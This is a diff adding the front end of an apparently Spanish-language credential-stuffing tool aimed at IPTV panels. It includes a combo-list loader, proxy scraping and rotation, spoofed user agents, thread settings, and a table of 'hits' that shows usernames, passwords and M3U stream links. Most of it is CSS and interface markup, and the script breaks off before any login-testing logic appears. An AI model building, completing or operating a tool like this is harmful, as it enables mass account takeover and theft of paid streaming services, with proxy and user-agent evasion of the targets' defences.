@@ -1,0 +1,1373 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>☢️ ALEXTEAMVENENO · CYBERPUNK NEON</title>
+    <style>
+        :root {
+            --neon-magenta: #ff00ff;
+            --neon-cyan: #00ffff;
+            --neon-green: #00ff41;
+            --neon-yellow: #ffe600;
+            --neon-orange: #ff6a00;
+            --neon-red: #ff0040;
+            --neon-purple: #b300ff;
+            --bg-deep: #050508;
+            --bg-card: rgba(13, 13, 26, 0.85);
+            --bg-input: rgba(15, 15, 30, 0.9);
+            --text-dim: #7a7a9a;
+            --text-body: #c0c0e0;
+            --text-bright: #e8e8ff;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: var(--bg-deep);
+            background-image:
+                url('photo_2026-02-22_00-18-30.jpg'),
+                linear-gradient(rgba(255, 0, 255, 0.02) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255, 0, 255, 0.02) 1px, transparent 1px),
+                radial-gradient(ellipse at center, transparent 30%, rgba(0, 0, 0, 0.75) 100%),
+                radial-gradient(ellipse at 20% 50%, rgba(255, 0, 255, 0.06) 0%, transparent 50%),
+                radial-gradient(ellipse at 80% 20%, rgba(0, 255, 255, 0.06) 0%, transparent 50%),
+                radial-gradient(ellipse at 50% 80%, rgba(0, 255, 65, 0.04) 0%, transparent 50%);
+            background-size: cover, 40px 40px, 40px 40px, 100% 100%, 100% 100%, 100% 100%, 100% 100%;
+            background-position: center center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            color: var(--text-body);
+            font-family: 'Courier New', 'Consolas', monospace;
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+            -webkit-tap-highlight-color: transparent;
+            -webkit-user-select: none;
+            user-select: none;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.55);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        body::after {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.03) 2px, rgba(0,0,0,0.03) 4px);
+            pointer-events: none;
+            z-index: 9999;
+            animation: scanlines 0.1s linear infinite;
+        }
+
+        @keyframes scanlines {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(4px); }
+        }
+
+        .content-wrapper { position: relative; z-index: 1; }
+
+        /* ============ BANNER ============ */
+        .banner {
+            background: linear-gradient(135deg, rgba(10,5,20,0.9), rgba(20,5,35,0.9), rgba(5,15,30,0.9));
+            border: 2px solid var(--neon-magenta);
+            border-radius: 3px;
+            padding: 10px 12px;
+            text-align: center;
+            font-size: 1.1em;
+            font-weight: 900;
+            letter-spacing: 3px;
+            margin: 8px;
+            text-shadow: 0 0 5px var(--neon-magenta), 0 0 15px var(--neon-magenta);
+            color: #fff;
+            animation: bannerGlow 2s ease-in-out infinite alternate;
+            clip-path: polygon(0% 0%, 100% 0%, 98% 50%, 100% 100%, 0% 100%, 2% 50%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        @keyframes bannerGlow {
+            0% { box-shadow: 0 0 5px var(--neon-magenta), 0 0 15px var(--neon-magenta); }
+            100% { box-shadow: 0 0 15px var(--neon-purple), 0 0 30px var(--neon-magenta); }
+        }
+
+        .banner-icon { font-size: 1.2em; animation: iconPulse 1s ease-in-out infinite; }
+        @keyframes iconPulse {
+            0%,100% { transform: scale(1); }
+            50% { transform: scale(1.15); }
+        }
+
+        .glitch-text { animation: glitch 5s linear infinite; }
+        @keyframes glitch {
+            0%,100% { text-shadow: 0 0 5px var(--neon-magenta); }
+            2% { text-shadow: -2px 0 var(--neon-cyan), 2px 0 var(--neon-red); }
+            4% { text-shadow: 0 0 5px var(--neon-magenta); }
+        }
+
+        .signature {
+            text-align: center;
+            font-size: 0.55em;
+            letter-spacing: 2px;
+            color: var(--neon-magenta);
+            text-shadow: 0 0 5px var(--neon-magenta);
+            opacity: 0.7;
+        }
+
+        /* ============ LAYOUT ============ */
+        .main-container {
+            display: flex;
+            gap: 8px;
+            padding: 0 8px 8px 8px;
+            height: calc(100vh - 130px);
+        }
+
+        .left-panel {
+            flex: 0 0 340px;
+            background: rgba(8,8,18,0.88);
+            border: 1px solid rgba(255,0,255,0.2);
+            border-radius: 4px;
+            padding: 8px;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            overflow-y: auto;
+            box-shadow: 0 0 20px rgba(255,0,255,0.05), inset 0 0 30px rgba(0,0,0,0.4);
+            position: relative;
+        }
+
+        .left-panel::before {
+            content: '';
+            position: absolute;
+            top: -1px;
+            left: 20px;
+            right: 20px;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--neon-magenta), var(--neon-cyan), var(--neon-magenta), transparent);
+            background-size: 200% 100%;
+            animation: topLine 3s linear infinite;
+        }
+        @keyframes topLine {
+            0% { background-position: -200% center; }
+            100% { background-position: 200% center; }
+        }
+
+        .right-panel {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+
+        /* ============ CARD ============ */
+        .card {
+            background: rgba(13,13,26,0.82);
+            border: 1px solid rgba(0,255,255,0.12);
+            border-radius: 3px;
+            padding: 8px;
+            transition: all 0.3s ease;
+        }
+
+        .card-title {
+            font-size: 0.7em;
+            font-weight: 700;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin-bottom: 6px;
+            padding-bottom: 5px;
+            border-bottom: 1px solid rgba(255,0,255,0.2);
+            background: linear-gradient(90deg, var(--neon-magenta), var(--neon-cyan));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        /* ============ INPUTS ============ */
+        input[type="text"], input[type="number"], select {
+            width: 100%;
+            background: rgba(10,10,25,0.9);
+            border: 1px solid rgba(0,255,255,0.25);
+            border-radius: 2px;
+            padding: 6px 8px;
+            color: var(--neon-cyan);
+            font-family: 'Courier New', 'Consolas', monospace;
+            font-size: 0.75em;
+            transition: all 0.3s ease;
+        }
+
+        input:focus, select:focus {
+            outline: none;
+            border-color: var(--neon-magenta);
+            box-shadow: 0 0 15px rgba(255,0,255,0.25);
+            color: #fff;
+        }
+
+        select {
+            cursor: pointer;
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='10' height='10' fill='%23ff00ff' viewBox='0 0 16 16'%3E%3Cpath d='M8 11L3 6h10z'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 8px center;
+        }
+        select option { background: #0a0a15; color: var(--neon-cyan); }
+
+        /* ============ BOTONES ============ */
+        button {
+            background: rgba(15,15,35,0.9);
+            border: 1px solid rgba(255,0,255,0.3);
+            border-radius: 2px;
+            padding: 6px 10px;
+            color: var(--text-bright);
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 0.72em;
+            letter-spacing: 1px;
+            font-family: 'Courier New', 'Consolas', monospace;
+            transition: all 0.25s ease;
+            text-transform: uppercase;
+            white-space: nowrap;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        button:active {
+            transform: scale(0.95);
+        }
+
+        button:hover {
+            border-color: var(--neon-magenta);
+            box-shadow: 0 0 15px rgba(255,0,255,0.3);
+            color: #fff;
+            text-shadow: 0 0 8px var(--neon-magenta);
+        }
+
+        .btn-start {
+            background: linear-gradient(135deg, rgba(180,0,50,0.9), rgba(255,0,64,0.9));
+            border: 2px solid var(--neon-red);
+            font-size: 0.9em;
+            padding: 12px;
+            width: 100%;
+            font-weight: 900;
+            letter-spacing: 3px;
+            animation: pulseStart 2s ease-in-out infinite;
+        }
+        @keyframes pulseStart {
+            0%,100% { box-shadow: 0 0 10px var(--neon-red); }
+            50% { box-shadow: 0 0 25px var(--neon-red), 0 0 50px rgba(255,0,64,0.6); }
+        }
+        .btn-start:disabled {
+            background: rgba(30,30,50,0.6);
+            border-color: rgba(100,100,150,0.3);
+            color: #555;
+            animation: none;
+            cursor: not-allowed;
+        }
+
+        .btn-stop {
+            background: linear-gradient(135deg, rgba(100,0,100,0.9), rgba(150,0,80,0.9));
+            border: 2px solid var(--neon-purple);
+            font-size: 0.9em;
+            padding: 12px;
+            width: 100%;
+            font-weight: 900;
+            letter-spacing: 3px;
+        }
+        .btn-stop:disabled {
+            background: rgba(30,30,50,0.6);
+            border-color: rgba(100,100,150,0.3);
+            color: #555;
+            cursor: not-allowed;
+        }
+
+        .btn-scrape {
+            background: rgba(0,30,50,0.9);
+            border: 1px solid rgba(0,255,255,0.4);
+            color: var(--neon-cyan);
+        }
+
+        .btn-clear {
+            background: rgba(40,0,20,0.9);
+            border-color: rgba(255,0,64,0.4);
+            color: var(--neon-red);
+            font-size: 0.65em;
+            padding: 4px 7px;
+        }
+
+        /* Botón guardar TXT */
+        .btn-save {
+            background: rgba(0,80,40,0.9);
+            border: 1px solid var(--neon-green);
+            color: var(--neon-green);
+            font-size: 0.75em;
+            padding: 8px 14px;
+            animation: pulseCopy 2s ease-in-out infinite;
+        }
+        @keyframes pulseCopy {
+            0%,100% { box-shadow: 0 0 5px rgba(0,255,65,0.3); }
+            50% { box-shadow: 0 0 15px rgba(0,255,65,0.6); }
+        }
+        .btn-save:hover {
+            border-color: var(--neon-green);
+            box-shadow: 0 0 20px rgba(0,255,65,0.6);
+            text-shadow: 0 0 8px var(--neon-green);
+        }
+
+        /* Botón copiar M3U */
+        .btn-copy-m3u {
+            background: rgba(0,100,50,0.9);
+            border: 1px solid var(--neon-green);
+            color: var(--neon-green);
+            font-size: 0.7em;
+            padding: 5px 8px;
+            letter-spacing: 0.5px;
+            min-width: 36px;
+            min-height: 36px;
+        }
+        .btn-copy-m3u:active {
+            background: rgba(0,255,65,0.4);
+        }
+
+        /* ============ STATS ============ */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 4px;
+        }
+
+        .stat-box {
+            background: rgba(15,15,30,0.8);
+            border: 1px solid rgba(0,255,255,0.1);
+            border-radius: 2px;
+            padding: 6px 3px;
+            text-align: center;
+            font-size: 0.6em;
+            color: var(--text-dim);
+            letter-spacing: 1px;
+        }
+
+        .stat-value {
+            font-size: 1.4em;
+            font-weight: 900;
+            display: block;
+            margin-top: 2px;
+        }
+
+        .stat-hits .stat-value { color: var(--neon-green); text-shadow: 0 0 10px rgba(0,255,65,0.5); }
+        .stat-errors .stat-value { color: var(--neon-red); text-shadow: 0 0 10px rgba(255,0,64,0.5); }
+
+        /* ============ CONSOLA ============ */
+        .console {
+            background: rgba(5,5,15,0.95);
+            border: 1px solid rgba(0,255,65,0.2);
+            border-radius: 2px;
+            padding: 8px;
+            flex: 1;
+            overflow-y: auto;
+            font-size: 0.68em;
+            line-height: 1.5;
+            min-height: 80px;
+            color: var(--neon-green);
+            text-shadow: 0 0 3px rgba(0,255,65,0.3);
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+
+        .console .log-info { color: #7a7aaa; text-shadow: none; }
+        .console .log-hit { color: var(--neon-green); text-shadow: 0 0 8px rgba(0,255,65,0.6); font-weight: bold; }
+        .console .log-err { color: var(--neon-red); text-shadow: 0 0 6px rgba(255,0,64,0.4); }
+        .console .log-warn { color: var(--neon-orange); }
+
+        /* ============ TABLA DE HITS (REDISEÑADA MÁS GRANDE) ============ */
+        .table-container {
+            flex: 1;
+            overflow-y: auto;
+            overflow-x: auto;
+            border: 1px solid rgba(0,255,255,0.15);
+            border-radius: 3px;
+            -webkit-overflow-scrolling: touch;
+        }
+
+        .hits-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 0.82em;
+            min-width: 700px;
+        }
+
+        .hits-table thead th {
+            background: rgba(20,5,35,0.95);
+            color: var(--neon-magenta);
+            padding: 10px 8px;
+            text-align: left;
+            border: 1px solid rgba(255,0,255,0.2);
+            position: sticky;
+            top: 0;
+            z-index: 2;
+            letter-spacing: 1px;
+            font-size: 0.85em;
+            text-shadow: 0 0 5px rgba(255,0,255,0.3);
+            white-space: nowrap;
+        }
+
+        .hits-table tbody td {
+            padding: 8px 8px;
+            border: 1px solid rgba(0,255,255,0.08);
+            color: var(--text-bright);
+            font-size: 0.9em;
+            vertical-align: middle;
+            white-space: nowrap;
+        }
+
+        /* Columnas específicas */
+        .hits-table .col-user { min-width: 140px; max-width: 200px; overflow: hidden; text-overflow: ellipsis; }
+        .hits-table .col-pass { min-width: 110px; max-width: 160px; overflow: hidden; text-overflow: ellipsis; }
+        .hits-table .col-status { min-width: 70px; text-align: center; }
+        .hits-table .col-exp { min-width: 90px; text-align: center; }
+        .hits-table .col-panel { min-width: 130px; max-width: 180px; overflow: hidden; text-overflow: ellipsis; }
+        .hits-table .col-ch { min-width: 55px; text-align: center; font-weight: bold; color: var(--neon-cyan); }
+        .hits-table .col-es { min-width: 50px; text-align: center; font-weight: bold; color: var(--neon-orange); }
+        .hits-table .col-movies { min-width: 50px; text-align: center; }
+        .hits-table .col-series { min-width: 50px; text-align: center; }
+        .hits-table .col-m3u { min-width: 200px; }
+
+        .hits-table tbody tr {
+            transition: background 0.2s;
+            cursor: pointer;
+        }
+
+        .hits-table tbody tr:nth-child(even) {
+            background: rgba(255,0,255,0.02);
+        }
+
+        .hits-table tbody tr:hover {
+            background: rgba(255,0,255,0.1) !important;
+            box-shadow: inset 0 0 20px rgba(255,0,255,0.12);
+        }
+
+        /* Celda M3U */
+        .m3u-cell {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            flex-wrap: wrap;
+        }
+
+        .m3u-link-text {
+            flex: 1;
+            min-width: 100px;
+            color: var(--neon-cyan);
+            cursor: pointer;
+            font-size: 0.78em;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            text-decoration: underline;
+            text-decoration-color: rgba(0,255,255,0.3);
+            -webkit-user-select: text;
+            user-select: text;
+        }
+
+        .m3u-link-text:hover {
+            color: #fff;
+            text-shadow: 0 0 8px var(--neon-cyan);
+        }
+
+        .cat-badge {
+            background: rgba(255,0,255,0.12);
+            border: 1px solid rgba(255,0,255,0.3);
+            border-radius: 3px;
+            padding: 3px 7px;
+            font-size: 0.75em;
+            color: var(--neon-magenta);
+            white-space: nowrap;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        .cat-badge:active {
+            background: rgba(255,0,255,0.3);
+        }
+
+        /* ============ MODAL M3U ============ */
+        .modal-overlay {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.9);
+            z-index: 10000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: fadeIn 0.2s ease;
+            padding: 15px;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .modal {
+            background: rgba(10,10,22,0.98);
+            border: 2px solid var(--neon-magenta);
+            border-radius: 5px;
+            padding: 15px;
+            max-width: 750px;
+            width: 100%;
+            max-height: 85vh;
+            overflow-y: auto;
+            box-shadow: 0 0 50px rgba(255,0,255,0.35), 0 0 100px rgba(255,0,255,0.1);
+            -webkit-overflow-scrolling: touch;
+        }
+
+        .modal-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 12px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid rgba(255,0,255,0.3);
+        }
+
+        .modal-logo { font-size: 1.8em; animation: iconPulse 1s ease-in-out infinite; }
+        .modal-title {
+            font-size: 0.9em;
+            font-weight: 900;
+            letter-spacing: 2px;
+            background: linear-gradient(90deg, var(--neon-magenta), var(--neon-cyan));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .modal-subtitle {
+            font-size: 0.65em;
+            color: var(--text-dim);
+            letter-spacing: 1px;
+        }
+
+        .hit-info-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 6px;
+            margin-bottom: 12px;
+        }
+
+        .hit-info-item {
+            background: rgba(15,15,30,0.8);
+            border: 1px solid rgba(0,255,255,0.12);
+            border-radius: 3px;
+            padding: 8px;
+            text-align: center;
+        }
+
+        .hit-info-label {
+            font-size: 0.55em;
+            color: var(--text-dim);
+            letter-spacing: 1px;
+            margin-bottom: 3px;
+        }
+
+        .hit-info-value {
+            font-size: 0.8em;
+            color: var(--neon-cyan);
+            font-weight: bold;
+            text-shadow: 0 0 5px rgba(0,255,255,0.3);
+            -webkit-user-select: text;
+            user-select: text;
+        }
+
+        .categories-section {
+            background: rgba(5,5,15,0.9);
+            border: 1px solid rgba(255,0,255,0.2);
+            border-radius: 3px;
+            padding: 10px;
+            margin-bottom: 12px;
+            max-height: 180px;
+            overflow-y: auto;
+        }
+
+        .categories-title {
+            font-size: 0.65em;
+            letter-spacing: 2px;
+            color: var(--neon-magenta);
+            margin-bottom: 6px;
+        }
+
+        .categories-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 3px;
+        }
+
+        .category-tag {
+            background: rgba(255,0,255,0.06);
+            border: 1px solid rgba(255,0,255,0.15);
+            border-radius: 2px;
+            padding: 3px 5px;
+            font-size: 0.58em;
+            color: var(--text-body);
+            text-align: center;
+        }
+
+        .m3u-link-full {
+            background: rgba(5,5,15,0.9);
+            border: 2px solid var(--neon-cyan);
+            border-radius: 4px;
+            padding: 14px;
+            color: var(--neon-cyan);
+            font-family: 'Courier New', monospace;
+            font-size: 0.75em;
+            word-break: break-all;
+            margin-bottom: 10px;
+            text-shadow: 0 0 5px rgba(0,255,255,0.3);
+            -webkit-user-select: text;
+            user-select: text;
+            cursor: text;
+            line-height: 1.5;
+        }
+
+        .modal-signature {
+            text-align: center;
+            font-size: 0.55em;
+            letter-spacing: 3px;
+            color: var(--neon-magenta);
+            text-shadow: 0 0 8px var(--neon-magenta);
+            margin-top: 10px;
+            padding-top: 8px;
+            border-top: 1px solid rgba(255,0,255,0.15);
+        }
+
+        .modal-buttons {
+            display: flex;
+            gap: 6px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        .modal-buttons button {
+            font-size: 0.78em;
+            padding: 10px 16px;
+            min-height: 44px;
+            min-width: 44px;
+        }
+
+        /* ============ PROGRESS ============ */
+        .progress-bar {
+            height: 16px;
+            background: rgba(10,10,25,0.9);
+            border-radius: 2px;
+            overflow: hidden;
+            border: 1px solid rgba(255,0,255,0.25);
+            margin: 4px 0;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--neon-purple), var(--neon-magenta), var(--neon-orange), var(--neon-red));
+            background-size: 200% 100%;
+            transition: width 0.3s;
+            width: 0%;
+            animation: progressGlow 2s linear infinite;
+        }
+        @keyframes progressGlow {
+            0% { background-position: 0% center; }
+            100% { background-position: 200% center; }
+        }
+
+        .progress-text {
+            text-align: center;
+            font-size: 0.65em;
+            color: var(--neon-cyan);
+            letter-spacing: 2px;
+        }
+
+        /* ============ UTILIDADES ============ */
+        .row { display: flex; gap: 6px; align-items: center; flex-wrap: wrap; }
+        .col { flex: 1; min-width: 0; }
+
+        label {
+            font-size: 0.68em;
+            color: var(--text-dim);
+            display: block;
+            margin-bottom: 2px;
+            letter-spacing: 0.5px;
+        }
+
+        .checkbox-row { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
+
+        input[type="checkbox"] {
+            accent-color: var(--neon-magenta);
+            width: 16px;
+            height: 16px;
+            cursor: pointer;
+            margin-right: 3px;
+        }
+
+        .toast {
+            position: fixed;
+            top: 15px;
+            right: 15px;
+            background: rgba(15,5,25,0.95);
+            border: 2px solid var(--neon-magenta);
+            border-radius: 3px;
+            padding: 12px 18px;
+            color: #fff;
+            z-index: 10001;
+            font-size: 0.85em;
+            letter-spacing: 1px;
+            box-shadow: 0 0 25px rgba(255,0,255,0.4);
+            animation: slideIn 0.3s ease;
+            display: none;
+            max-width: 90vw;
+        }
+
+        @keyframes slideIn {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar { width: 5px; height: 5px; }
+        ::-webkit-scrollbar-track { background: rgba(0,0,0,0.5); }
+        ::-webkit-scrollbar-thumb { background: rgba(255,0,255,0.35); border-radius: 3px; }
+
+        .footer-signature {
+            text-align: center;
+            padding: 3px;
+            font-size: 0.5em;
+            letter-spacing: 2px;
+            color: var(--neon-magenta);
+            text-shadow: 0 0 5px var(--neon-magenta);
+            opacity: 0.5;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* ============ RESPONSIVE ============ */
+        @media (max-width: 900px) {
+            .main-container {
+                flex-direction: column;
+                height: auto;
+                gap: 6px;
+            }
+            .left-panel {
+                flex: none;
+                max-height: 45vh;
+                position: sticky;
+                top: 8px;
+                z-index: 5;
+            }
+            .banner {
+                font-size: 0.85em;
+                letter-spacing: 2px;
+                clip-path: none;
+                padding: 8px;
+                margin: 6px;
+            }
+            .stats-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            .hit-info-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            .categories-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            .hits-table {
+                font-size: 0.75em;
+            }
+            .hits-table thead th,
+            .hits-table tbody td {
+                padding: 6px 5px;
+            }
+            .modal {
+                padding: 10px;
+                max-width: 95vw;
+            }
+            .m3u-link-full {
+                font-size: 0.7em;
+                padding: 10px;
+            }
+        }
+
+        @media (max-width: 500px) {
+            .banner { font-size: 0.7em; letter-spacing: 1px; }
+            .hits-table { font-size: 0.7em; min-width: 600px; }
+            .row { flex-direction: column; gap: 4px; }
+            .modal-buttons { flex-direction: column; }
+            .modal-buttons button { width: 100%; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="content-wrapper">
+        <!-- BANNER -->
+        <div class="banner">
+            <span class="banner-icon">☢️</span>
+            <span class="glitch-text">TEAM VENENO · ALEX92</span>
+            <span class="banner-icon">☢️</span>
+        </div>
+        <div class="signature">[ ALEXTEAMVENENO ]</div>
+
+        <div class="main-container">
+            <!-- PANEL IZQUIERDO -->
+            <div class="left-panel">
+                <div class="card">
+                    <div class="card-title">📁 // COMBO_LOADER</div>
+                    <div class="row">
+                        <input type="file" id="comboFile" accept=".txt" style="display:none;" onchange="handleComboFile(event)">
+                        <button onclick="document.getElementById('comboFile').click()" style="flex:1;">📂 LOAD FILE</button>
+                        <span id="comboStatus" style="font-size:0.65em; color: var(--neon-cyan);">0</span>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="card-title">🌐 // PROXY_MATRIX</div>
+                    <select id="proxyType" style="margin-bottom:4px;">
+                        <option value="0">[ AUTO ] Premium → SOCKS5h</option>
+                        <option value="1">[ HTTP ] Force</option>
+                        <option value="2">[ SOCKS4 ] Force</option>
+                        <option value="3">[ SOCKS5 ] Force</option>
+                    </select>
+                    <div class="row">
+                        <input type="file" id="proxyFile" accept=".txt" style="display:none;" onchange="handleProxyFile(event)">
+                        <button onclick="document.getElementById('proxyFile').click()" style="flex:1;">🔄 LOAD</button>
+                        <button class="btn-scrape" onclick="scrapeProxies()" style="flex:1;" id="btnScrape">🌐 SCRAPE</button>
+                    </div>
+                    <span id="proxyStatus" style="font-size:0.65em; color: var(--neon-cyan);">> 0 proxies</span>
+                </div>
+
+                <div class="card">
+                    <div class="card-title">⚙️ // CONFIG</div>
+                    <label>🌐 TARGET URL (comma separated)</label>
+                    <input type="text" id="portals" placeholder="panel1.com:80, panel2.com">
+                    <div class="row" style="margin-top:5px;">
+                        <div class="col"><label>🤖 THREADS</label><input type="number" id="threads" value="20" min="1" max="500"></div>
+                        <div style="display:flex;gap:8px;align-items:flex-end;padding-bottom:4px;">
+                            <label style="margin:0;color:var(--neon-cyan);"><input type="checkbox" id="useHttps"> SSL</label>
+                            <label style="margin:0;color:var(--neon-cyan);"><input type="checkbox" id="useProxies" checked> PROXY</label>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="card-title">🎛️ // FILTER</div>
+                    <div class="checkbox-row">
+                        <label style="color:#aaa;"><input type="checkbox" id="logInfo" checked> INFO</label>
+                        <label style="color:var(--neon-green);"><input type="checkbox" id="logHits" checked> HITS</label>
+                        <label style="color:var(--neon-red);"><input type="checkbox" id="logErrors"> ERR</label>
+                    </div>
+                </div>
+
+                <div class="card" style="flex:1; display:flex; flex-direction:column;">
+                    <div class="card-title">📟 // CONSOLE</div>
+                    <div class="console" id="console">> ALEXTEAMVENENO · v14.0<br>> Ready...</div>
+                </div>
+            </div>
+
+            <!-- PANEL DERECHO -->
+            <div class="right-panel">
+                <div class="card">
+                    <div class="stats-grid">
+                        <div class="stat-box"><span>🔍 SCANNED</span><span class="stat-value" id="statChecked">0</span></div>
+                        <div class="stat-box stat-hits"><span>✅ HITS</span><span class="stat-value" id="statHits">0</span></div>
+                        <div class="stat-box stat-errors"><span>❌ ERR</span><span class="stat-value" id="statErrors">0</span></div>
+                        <div class="stat-box"><span>📈 CPM</span><span class="stat-value" id="statCPM" style="color:var(--neon-yellow);">0</span></div>
+                        <div class="stat-box"><span>🎯 RATE</span><span class="stat-value" id="statRate" style="color:var(--neon-cyan);">0%</span></div>
+                        <div class="stat-box"><span>⏳ ETA</span><span class="stat-value" id="statETA" style="color:var(--neon-cyan);">00:00</span></div>
+                        <div class="stat-box"><span>📺 CH</span><span class="stat-value" id="statChannels" style="color:#ff1493;">0</span></div>
+                        <div class="stat-box"><span>🇪🇸 ESP</span><span class="stat-value" id="statSpain" style="color:var(--neon-orange);">0</span></div>
+                    </div>
+                    <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+                    <div class="progress-text" id="progressText">[ 0 / 0 ] 0%</div>
+                </div>
+
+                <!-- Barra de acciones -->
+                <div class="row" style="gap:4px;">
+                    <button class="btn-save" onclick="saveHitsToTxt()" style="flex:1;">💾 GUARDAR HITS TXT</button>
+                    <button class="btn-clear" onclick="clearHits()" style="flex:1;">🗑️ LIMPIAR HITS</button>
+                </div>
+
+                <div class="card" style="flex:1; display:flex; flex-direction:column; padding:6px;">
+                    <div class="card-title" style="margin-bottom:4px;">⭐ // HIT DATABASE</div>
+                    <div class="table-container">
+                        <table class="hits-table" id="hitsTable">
+                            <thead>
+                                <tr>
+                                    <th>USER</th>
+                                    <th>PASS</th>
+                                    <th>STATUS</th>
+                                    <th>EXP</th>
+                                    <th>PANEL</th>
+                                    <th>📺</th>
+                                    <th>🇪🇸</th>
+                                    <th>🎬</th>
+                                    <th>🍿</th>
+                                    <th>CATS</th>
+                                    <th>M3U LINK</th>
+                                </tr>
+                            </thead>
+                            <tbody id="hitsBody"></tbody>
+                        </table>
+                    </div>
+                </div>
+
+                <div class="row">
+                    <button class="btn-start" id="btnStart" onclick="startScan()">🚀 DEPLOY</button>
+                    <button class="btn-stop" id="btnStop" onclick="stopScan()" disabled>⬛ ABORT</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer-signature">[ ALEXTEAMVENENO ] · CYBERPUNK NEON · 2026</div>
+    </div>
+
+    <!-- MODAL -->
+    <div class="modal-overlay" id="m3uModal" style="display:none;" onclick="closeM3uModal(event)">
+        <div class="modal" onclick="event.stopPropagation()">
+            <div class="modal-header">
+                <span class="modal-logo">☢️</span>
+                <div>
+                    <div class="modal-title">HIT DETAILS</div>
+                    <div class="modal-subtitle">ALEXTEAMVENENO</div>
+                </div>
+            </div>
+            <div class="hit-info-grid" id="modalHitInfo"></div>
+            <div class="categories-section" id="modalCategories" style="display:none;">
+                <div class="categories-title">📂 CATEGORIES</div>
+                <div class="categories-grid" id="modalCategoriesGrid"></div>
+            </div>
+            <div class="m3u-link-full" id="m3uModalLink" onclick="copyM3uFromModal()"></div>
+            <div class="modal-buttons">
+                <button class="btn-copy-m3u" onclick="copyM3uFromModal()" style="font-size:0.85em; padding:12px 20px;">📋 COPIAR M3U</button>
+                <button class="btn-save" onclick="copyAllDetails()" style="font-size:0.85em; padding:12px 20px;">📄 COPIAR TODO</button>
+                <button onclick="closeM3uModalDirect()">❌ CERRAR</button>
+            </div>
+            <div class="modal-signature">[ ALEXTEAMVENENO ]</div>
+        </div>
+    </div>
+
+    <div class="toast" id="toast"></div>
+
+    <script>
+        // ==================== ESTADO ====================
+        const state = {
+            comboLines: [],
+            proxies: [],
+            hits: [],
+            isRunning: false,
+            stats: { checked: 0, hits: 0, errors: 0 },
+            startTime: 0,
+            totalCombos: 0,
+            proxyIndex: 0,
+            totalChannels: 0,
+            totalSpain: 0,
+            currentModalHit: null
+        };
+
+        const USER_AGENTS = [
+            "VLC/3.0.20 LibVLC/3.0.20", "ExoPlayerDemo/2.19.1", "Kodi/20.2", "Dalvik/2.1.0",
+            "Roku4640X/DVP-11.50", "Mozilla/5.0 (SMART-TV; Tizen 7.0)", "Mozilla/5.0 (Web0S; Linux/SmartTV)",
+            "Mozilla/5.0 (Linux; Android 14)", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/123.0.0.0",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4)"
+        ];
+
+        function getRandomUA() { return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)]; }
+
+        function getNextProxy() {
+            if (state.proxies.length === 0 || !document.getElementById('useProxies').checked) return null;
+            return state.proxies[state.proxyIndex++ % state.proxies.length];
+        }
+
+        // ==================== LOG ====================
+        function log(msg, type = 'info') {
+            const filters = { info: 'logInfo', hit: 'logHits', err: 'logErrors' };
+            if (!document.getElementById(filters[type]).checked) return;
